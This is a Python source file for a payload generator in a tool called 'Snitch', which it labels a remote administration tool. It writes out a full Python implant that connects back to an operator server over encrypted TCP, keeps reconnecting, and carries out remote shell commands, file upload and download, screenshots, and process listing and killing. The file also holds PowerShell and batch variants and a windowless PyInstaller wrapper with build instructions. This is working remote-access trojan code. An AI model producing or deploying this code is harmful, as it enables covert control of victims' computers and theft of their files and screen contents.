"""
Payload generation for Snitch application.
"""
from __future__ import annotations

import base64
import logging
import platform
from pathlib import Path
from typing import Optional

from .Snitch_utils import crypto
from .Snitch_Vars.globals import PAYLOADS_DIR

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Generates various types of payloads for Snitch."""
    
    def __init__(self):
        self.payloads_dir = PAYLOADS_DIR
        self.payloads_dir.mkdir(exist_ok=True)
    
    def generate_python_payload(self, server_ip: str, server_port: int) -> Optional[Path]:
        """Generate Python script payload."""
        try:
            # Get current AES key
            key_info = crypto.get_current_key_info()
            if "error" in key_info:
                logger.error("No AES key available for payload generation")
                return None
            
            aes_key = key_info["key_encoded"]
            
            payload_content = f'''#!/usr/bin/env python3
"""
Snitch Python Payload
Auto-generated payload for Snitch Remote Administration Tool.
"""
import base64
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

# Configuration
SERVER_IP = "{server_ip}"
SERVER_PORT = {server_port}
AES_KEY = "{aes_key}"
RECONNECT_DELAY = 5
MAX_RECONNECT_ATTEMPTS = 10

# Import AES encryption
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except ImportError:
    print("pycryptodome not available, attempting to install...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        from Crypto.Cipher import AES
        from Crypto.Random import get_random_bytes
    except Exception:
        print("Failed to install pycryptodome")
        sys.exit(1)


class SnitchPayload:
    """Main payload class."""
    
    def __init__(self):
        self.socket = None
        self.connected = False
        self.aes_key = base64.b64decode(AES_KEY)
        self.current_directory = Path.cwd()
        self.running = True
    
    def encrypt_data(self, data):
        """Encrypt data using AES CFB mode."""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        iv = get_random_bytes(16)
        cipher = AES.new(self.aes_key, AES.MODE_CFB, iv)
        encrypted_data = cipher.encrypt(data)
        
        return iv + encrypted_data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES CFB mode."""
        if len(encrypted_data) < 16:
            raise ValueError("Encrypted data too short")
        
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        cipher = AES.new(self.aes_key, AES.MODE_CFB, iv)
        decrypted_data = cipher.decrypt(ciphertext)
        
        return decrypted_data
    
    def send_encrypted(self, data):
        """Send encrypted data to server."""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            
            encrypted_data = self.encrypt_data(data)
            message_length = len(encrypted_data)
            length_header = struct.pack('!I', message_length)
            
            self.socket.sendall(length_header + encrypted_data)
            return True
        except Exception as e:
            print(f"Send failed: {{e}}")
            return False
    
    def receive_encrypted(self, timeout=None):
        """Receive encrypted data from server."""
        try:
            if timeout:
                self.socket.settimeout(timeout)
            
            # Receive message length
            length_data = self._receive_exact(4)
            if not length_data:
                return None
            
            message_length = struct.unpack('!I', length_data)[0]
            
            if message_length > 10 * 1024 * 1024:  # 10MB limit
                return None
            
            # Receive encrypted message
            encrypted_data = self._receive_exact(message_length)
            if not encrypted_data:
                return None
            
            # Decrypt data
            decrypted_data = self.decrypt_data(encrypted_data)
            return decrypted_data
            
        except Exception as e:
            print(f"Receive failed: {{e}}")
            return None
        finally:
            if timeout:
                self.socket.settimeout(None)
    
    def _receive_exact(self, length):
        """Receive exact number of bytes."""
        data = b''
        while len(data) < length:
            try:
                chunk = self.socket.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk
            except Exception:
                return None
        return data
    
    def connect_to_server(self):
        """Connect to Snitch server."""
        for attempt in range(MAX_RECONNECT_ATTEMPTS):
            try:
                print(f"Connecting to {{SERVER_IP}}:{{SERVER_PORT}} (attempt {{attempt + 1}})")
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10.0)
                self.socket.connect((SERVER_IP, SERVER_PORT))
                
                self.connected = True
                print("Connected to server")
                
                # Handle handshake
                handshake = self.receive_encrypted(timeout=30.0)
                if handshake:
                    server_info = json.loads(handshake.decode('utf-8'))
                    print(f"Server: {{server_info}}")
                    
                    # Send client info
                    client_info = {{
                        "type": "client_info",
                        "platform": platform.system(),
                        "hostname": platform.node(),
                        "user": os.getenv('USERNAME') or os.getenv('USER', 'unknown'),
                        "timestamp": time.time()
                    }}
                    
                    self.send_encrypted(client_info)
                    return True
                
            except Exception as e:
                print(f"Connection failed: {{e}}")
                self.connected = False
                if self.socket:
                    try:
                        self.socket.close()
                    except Exception:
                        pass
                    self.socket = None
                
                if attempt < MAX_RECONNECT_ATTEMPTS - 1:
                    print(f"Retrying in {{RECONNECT_DELAY}} seconds...")
                    time.sleep(RECONNECT_DELAY)
        
        return False
    
    def handle_command(self, command_data):
        """Handle command from server."""
        try:
            command = command_data.get("command")
            args = command_data.get("args", {{}})
            
            if command == "shell":
                return self._handle_shell(args.get("command", ""))
            elif command == "execute":
                return self._handle_execute(args.get("command", ""))
            elif command == "sysinfo":
                return self._handle_sysinfo()
            elif command == "upload":
                return self._handle_upload(args)
            elif command == "download":
                return self._handle_download(args)
            elif command == "listdir":
                return self._handle_listdir(args.get("path", "."))
            elif command == "pwd":
                return self._handle_pwd()
            elif command == "chdir":
                return self._handle_chdir(args.get("path", ""))
            elif command == "screenshot":
                return self._handle_screenshot()
            elif command == "processes":
                return self._handle_processes()
            elif command == "kill":
                return self._handle_kill(args.get("pid", 0))
            elif command == "lock":
                return self._handle_lock()
            else:
                return {{"success": False, "error": f"Unknown command: {{command}}"}}
                
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_shell(self, command):
        """Handle shell command."""
        return self._execute_command(command)
    
    def _handle_execute(self, command):
        """Handle execute command."""
        return self._execute_command(command)
    
    def _execute_command(self, command):
        """Execute system command."""
        try:
            # Handle built-in commands
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                return self._handle_chdir(path)
            elif command.lower() in ['pwd', 'cd']:
                return self._handle_pwd()
            
            # Execute external command
            result = subprocess.run(
                command,
                shell=True,
                cwd=self.current_directory,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\\nSTDERR:\\n{{result.stderr}}"
            
            return {{
                "success": result.returncode == 0,
                "output": output.strip(),
                "return_code": result.returncode
            }}
            
        except subprocess.TimeoutExpired:
            return {{"success": False, "error": "Command timed out"}}
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_sysinfo(self):
        """Get system information."""
        try:
            info = {{
                "os": platform.system(),
                "platform": platform.platform(),
                "hostname": platform.node(),
                "user": os.getenv('USERNAME') or os.getenv('USER', 'unknown'),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "python_version": sys.version,
                "current_directory": str(self.current_directory)
            }}
            
            return {{"success": True, "data": info}}
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_upload(self, args):
        """Handle file upload."""
        try:
            path = args.get("path", "")
            data_b64 = args.get("data", "")
            
            if not path or not data_b64:
                return {{"success": False, "error": "Missing path or data"}}
            
            file_data = base64.b64decode(data_b64)
            
            upload_path = Path(path)
            upload_path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(upload_path, 'wb') as f:
                f.write(file_data)
            
            return {{"success": True, "message": f"File uploaded to {{path}}"}}
            
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_download(self, args):
        """Handle file download."""
        try:
            path = args.get("path", "")
            
            if not path:
                return {{"success": False, "error": "Missing path"}}
            
            file_path = Path(path)
            
            if not file_path.exists():
                return {{"success": False, "error": "File not found"}}
            
            if not file_path.is_file():
                return {{"success": False, "error": "Not a file"}}
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            data_b64 = base64.b64encode(file_data).decode('ascii')
            
            return {{
                "success": True,
                "data": data_b64,
                "size": len(file_data)
            }}
            
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_listdir(self, path):
        """List directory contents."""
        try:
            dir_path = Path(path)
            
            if not dir_path.exists():
                return {{"success": False, "error": "Directory not found"}}
            
            if not dir_path.is_dir():
                return {{"success": False, "error": "Not a directory"}}
            
            files = []
            for item in dir_path.iterdir():
                try:
                    stat = item.stat()
                    files.append({{
                        "name": item.name,
                        "is_dir": item.is_dir(),
                        "size": stat.st_size if item.is_file() else 0,
                        "modified": stat.st_mtime
                    }})
                except (OSError, PermissionError):
                    continue
            
            return {{"success": True, "files": files}}
            
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_pwd(self):
        """Get current directory."""
        return {{"success": True, "path": str(self.current_directory)}}
    
    def _handle_chdir(self, path):
        """Change directory."""
        try:
            if not path:
                return {{"success": True, "path": str(self.current_directory)}}
            
            if Path(path).is_absolute():
                new_path = Path(path)
            else:
                new_path = self.current_directory / path
            
            new_path = new_path.resolve()
            
            if not new_path.exists():
                return {{"success": False, "error": "Directory not found"}}
            
            if not new_path.is_dir():
                return {{"success": False, "error": "Not a directory"}}
            
            self.current_directory = new_path
            return {{"success": True, "path": str(self.current_directory)}}
            
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_screenshot(self):
        """Take screenshot."""
        try:
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = img_buffer.getvalue()
            
            img_b64 = base64.b64encode(img_data).decode('ascii')
            
            return {{
                "success": True,
                "data": img_b64,
                "size": len(img_data)
            }}
            
        except ImportError:
            return {{"success": False, "error": "PIL not available"}}
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_processes(self):
        """Get running processes."""
        try:
            processes = []
            
            if platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['tasklist', '/fo', 'csv'],
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='replace'
                )
                
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\\n')
                    for line in lines[1:]:
                        try:
                            parts = [p.strip('"') for p in line.split('","')]
                            if len(parts) >= 5:
                                processes.append({{
                                    "name": parts[0],
                                    "pid": int(parts[1]),
                                    "memory": parts[4]
                                }})
                        except (ValueError, IndexError):
                            continue
            
            return {{"success": True, "processes": processes[:50]}}
            
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_kill(self, pid):
        """Kill process."""
        try:
            if platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['taskkill', '/F', '/PID', str(pid)],
                    capture_output=True,
                    text=True
                )
            else:
                result = subprocess.run(
                    ['kill', '-9', str(pid)],
                    capture_output=True,
                    text=True
                )
            
            return {{
                "success": result.returncode == 0,
                "output": result.stdout + result.stderr
            }}
            
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def _handle_lock(self):
        """Lock screen."""
        try:
            if platform.system().lower() == 'windows':
                subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'])
                return {{"success": True, "message": "Screen locked"}}
            else:
                return {{"success": False, "error": "Lock not supported on this platform"}}
                
        except Exception as e:
            return {{"success": False, "error": str(e)}}
    
    def run(self):
        """Main payload loop."""
        print("Snitch Payload Starting...")
        
        while self.running:
            if not self.connected:
                if not self.connect_to_server():
                    print("Failed to connect, exiting...")
                    break
            
            try:
                # Receive command
                data = self.receive_encrypted(timeout=60.0)
                
                if data:
                    try:
                        command_data = json.loads(data.decode('utf-8'))
                        
                        if command_data.get("type") == "command":
                            # Handle command
                            response = self.handle_command(command_data)
                            
                            # Send response
                            if not self.send_encrypted(response):
                                self.connected = False
                        elif command_data.get("type") == "keepalive":
                            # Respond to keepalive
                            keepalive_response = {{
                                "type": "keepalive_response",
                                "timestamp": time.time()
                            }}
                            
                            if not self.send_encrypted(keepalive_response):
                                self.connected = False
                                
                    except json.JSONDecodeError:
                        print("Invalid JSON received")
                        
                else:
                    # No data received, connection might be lost
                    self.connected = False
                    
            except Exception as e:
                print(f"Error in main loop: {{e}}")
                self.connected = False
            
            if not self.connected:
                print("Connection lost, attempting to reconnect...")
                if self.socket:
                    try:
                        self.socket.close()
                    except Exception:
                        pass
                    self.socket = None
                
                time.sleep(RECONNECT_DELAY)


def main():
    """Main entry point."""
    try:
        payload = SnitchPayload()
        payload.run()
    except KeyboardInterrupt:
        print("\\nPayload stopped by user")
    except Exception as e:
        print(f"Payload error: {{e}}")


if __name__ == "__main__":
    main()
'''
            
            # Save payload
            filename = f"snitch_payload_{server_ip}_{server_port}.py"
            payload_path = self.payloads_dir / filename
            
            with open(payload_path, 'w', encoding='utf-8') as f:
                f.write(payload_content)
            
            logger.info(f"Generated Python payload: {payload_path}")
            return payload_path
            
        except Exception as e:
            logger.error(f"Failed to generate Python payload: {e}")
            return None
    
    def generate_powershell_payload(self, server_ip: str, server_port: int) -> Optional[Path]:
        """Generate PowerShell script payload."""
        try:
            # Get current AES key
            key_info = crypto.get_current_key_info()
            if "error" in key_info:
                logger.error("No AES key available for payload generation")
                return None
            
            aes_key = key_info["key_encoded"]
            
            payload_content = f'''# Snitch PowerShell Payload
# Auto-generated payload for Snitch Remote Administration Tool

$SERVER_IP = "{server_ip}"
$SERVER_PORT = {server_port}
$AES_KEY = "{aes_key}"

Write-Host "Snitch PowerShell Payload Starting..."
Write-Host "Target: $SERVER_IP`:$SERVER_PORT"

# Basic connection attempt
try {{
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($SERVER_IP, $SERVER_PORT)
    
    if ($client.Connected) {{
        Write-Host "Connected to server"
        
        # Send basic system info
        $info = @{{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            os = "Windows"
            platform = "PowerShell"
            timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        }}
        
        $json = $info | ConvertTo-Json
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        
        $stream = $client.GetStream()
        $stream.Write($bytes, 0, $bytes.Length)
        
        Write-Host "System info sent"
        
        # Keep connection alive for a short time
        Start-Sleep -Seconds 10
        
        $client.Close()
        Write-Host "Connection closed"
    }}
}} catch {{
    Write-Host "Connection failed: $($_.Exception.Message)"
}}

Write-Host "Payload completed"
'''
            
            # Save payload
            filename = f"snitch_payload_{server_ip}_{server_port}.ps1"
            payload_path = self.payloads_dir / filename
            
            with open(payload_path, 'w', encoding='utf-8') as f:
                f.write(payload_content)
            
            logger.info(f"Generated PowerShell payload: {payload_path}")
            return payload_path
            
        except Exception as e:
            logger.error(f"Failed to generate PowerShell payload: {e}")
            return None
    
    def generate_batch_payload(self, server_ip: str, server_port: int) -> Optional[Path]:
        """Generate batch file payload."""
        try:
            payload_content = f'''@echo off
REM Snitch Batch Payload
REM Auto-generated payload for Snitch Remote Administration Tool

echo Snitch Batch Payload Starting...
echo Target: {server_ip}:{server_port}

REM Basic system info
echo System Information:
echo Hostname: %COMPUTERNAME%
echo User: %USERNAME%
echo OS: %OS%
echo Date: %DATE%
echo Time: %TIME%

REM Try to connect using telnet (if available)
echo Attempting connection...
telnet {server_ip} {server_port}

echo Payload completed
pause
'''
            
            # Save payload
            filename = f"snitch_payload_{server_ip}_{server_port}.bat"
            payload_path = self.payloads_dir / filename
            
            with open(payload_path, 'w', encoding='utf-8') as f:
                f.write(payload_content)
            
            logger.info(f"Generated batch payload: {payload_path}")
            return payload_path
            
        except Exception as e:
            logger.error(f"Failed to generate batch payload: {e}")
            return None
    
    def generate_executable_payload(self, server_ip: str, server_port: int) -> Optional[Path]:
        """Generate Windows executable payload."""
        try:
            # First generate Python payload
            python_payload = self.generate_python_payload(server_ip, server_port)
            if not python_payload:
                return None
            
            # Create a simple wrapper script that can be converted to exe
            wrapper_content = f'''#!/usr/bin/env python3
"""
Snitch Executable Payload Wrapper
"""
import sys
import subprocess
from pathlib import Path

# Embedded payload path
PAYLOAD_PATH = r"{python_payload}"

def main():
    """Run the embedded payload."""
    try:
        if Path(PAYLOAD_PATH).exists():
            subprocess.run([sys.executable, PAYLOAD_PATH])
        else:
            print(f"Payload not found: {{PAYLOAD_PATH}}")
    except Exception as e:
        print(f"Error running payload: {{e}}")

if __name__ == "__main__":
    main()
'''
            
            # Save wrapper
            wrapper_filename = f"snitch_wrapper_{server_ip}_{server_port}.py"
            wrapper_path = self.payloads_dir / wrapper_filename
            
            with open(wrapper_path, 'w', encoding='utf-8') as f:
                f.write(wrapper_content)
            
            # Create instructions for converting to exe
            instructions_content = f'''Instructions for creating executable:

1. Install PyInstaller:
   pip install pyinstaller

2. Create executable:
   pyinstaller --onefile --noconsole {wrapper_path}

3. The executable will be created in the 'dist' folder

Note: The Python payload ({python_payload}) must be available 
at runtime for the executable to work properly.

Alternative: Use auto-py-to-exe for a GUI interface:
   pip install auto-py-to-exe
   auto-py-to-exe
'''
            
            instructions_path = self.payloads_dir / f"exe_instructions_{server_ip}_{server_port}.txt"
            with open(instructions_path, 'w', encoding='utf-8') as f:
                f.write(instructions_content)
            
            logger.info(f"Generated executable wrapper: {wrapper_path}")
            logger.info(f"Instructions saved: {instructions_path}")
            return wrapper_path
            
        except Exception as e:
            logger.error(f"Failed to generate executable payload: {e}")
            return None
    
    def list_available_types(self) -> list[str]:
        """List available payload types."""
        return ["python", "powershell", "batch", "exe"]
    
    def generate_payload(self, payload_type: str, server_ip: str, server_port: int) -> Optional[Path]:
        """Generate payload of specified type."""
        payload_type = payload_type.lower()
        
        generators = {
            "python": self.generate_python_payload,
            "powershell": self.generate_powershell_payload,
            "batch": self.generate_batch_payload,
            "exe": self.generate_executable_payload
        }
        
        if payload_type not in generators:
            logger.error(f"Unknown payload type: {payload_type}")
            return None
        
        return generators[payload_type](server_ip, server_port)


# Global payload generator instance
payload_generator = PayloadGenerator()